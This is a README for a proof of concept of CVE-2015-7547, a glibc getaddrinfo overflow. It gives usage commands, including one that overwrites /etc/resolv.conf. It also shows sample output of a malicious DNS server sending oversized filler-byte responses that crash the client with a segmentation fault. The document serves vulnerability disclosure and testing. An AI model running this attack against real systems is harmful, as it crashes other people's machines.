
Scapy based PoC for CVE-2015-7547

    #> python CVE-2015-7547-poc.py &
    #> echo "nameserver 127.0.0.1" > /etc/resolv.conf
    #> python -c "import socket; socket.getaddrinfo('foo.oststrom.com',22,0,0,socket.IPPROTO_TCP)"


**Readme**

We are providing this code as-is. You are responsible for protecting yourself,
your property and data, and others from any risks caused by this code. This
code may cause unexpected and undesirable behavior to occur on your machine.
This code may not detect the vulnerability on your system.

Note that this POC consists of two components: server code and client code.
The server code triggers the vulnerability and therefore will crash the client
code. Note also that it is necessary to set the nameserver to point to the
server code, and doing so could cause other programs that call into the
getaddrinfo() function to crash while testing is underway. This POC code is
provided "as is" with no warranties, whether express or implied, including
without limitation any warranties or merchantability, fitness for a particular
use and noninfringement. Google assumes no responsibility for your proper
installation and use of the POC code.

**Example**

    # python CVE-2015-7547-poc.py
    WARNING: No route found for IPv6 destination :: (no default route?)
    <== received (      34) <DNS  id=26670 qr=0L opcode=QUERY aa=0L tc=0L rd=1L ra=0L z=0L ad=0L cd=0L rcode=ok qdcount=1 ancount=0 nscount=0 arcount=0 qd=<DNSQR  qname='foo.oststrom.com.' qtype=A qclass=IN |> an=None ns=None ar=None |>...
    <== received (      34) <DNS  id=36455 qr=0L opcode=QUERY aa=0L tc=0L rd=1L ra=0L z=0L ad=0L cd=0L rcode=ok qdcount=1 ancount=0 nscount=0 arcount=0 qd=<DNSQR  qname='foo.oststrom.com.' qtype=AAAA qclass=IN |> an=None ns=None ar=None |>...
    ==> sent: (    2534) <DNS  id=26670 qr=1 opcode=QUERY aa=0 tc=1 rd=1 ra=1 z=0 ad=0 cd=0 qd=<DNSQR  qname='foo.oststrom.com.' qtype=A qclass=IN |> |<Raw  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x...
     <== new peer('127.0.0.1', 44902)
    <== received: (      36) <TCPDNS  length=34 id=26670 qr=0L opcode=QUERY aa=0L tc=0L rd=1L ra=0L z=0L ad=0L cd=0L rcode=ok qdcount=1 ancount=0 nscount=0 arcount=0 qd=<DNSQR  qname='foo.oststrom.com.' qtype=A qclass=IN |> an=None ns=None ar=None |>...
    <== received: (      36) <TCPDNS  length=34 id=36455 qr=0L opcode=QUERY aa=0L tc=0L rd=1L ra=0L z=0L ad=0L cd=0L rcode=ok qdcount=1 ancount=0 nscount=0 arcount=0 qd=<DNSQR  qname='foo.oststrom.com.' qtype=AAAA qclass=IN |> an=None ns=None ar=None |>...
    ==> sent: (    2534) <DNS  id=36455 qr=1 opcode=QUERY aa=0 tc=1 rd=1 ra=1 z=0 ad=0 cd=0 qd=<DNSQR  qname='foo.oststrom.com.' qtype=AAAA qclass=IN |> |<Raw  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0...
    ==> sent: (      93) <TCPDNS  length=91 id=26670 qr=1 opcode=QUERY aa=0 tc=0 rd=1 ra=1 z=0 ad=0 cd=0 qd=<DNSQR  qname='.' qtype=MD qclass=26223 |> an=<DNSRR  rrname='.' type=25185 rclass=29190 ttl=1735356263 rdlen=63 rdata='\x03com\x00\x00\x01\x00\x01\x00$\x84(\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03foo\x03bar\x06google\x03com\x00\x00\x1c\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\r\x00\x04DDDD' |> |>...
    ==> sent: (    2314) <TCPDNS  length=2312 id=36455 |<Raw  load='BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB...

    # python -c "import socket; socket.getaddrinfo('foo.oststrom.com',22,0,0,socket.IPPROTO_TCP)"
    Segmentation fault

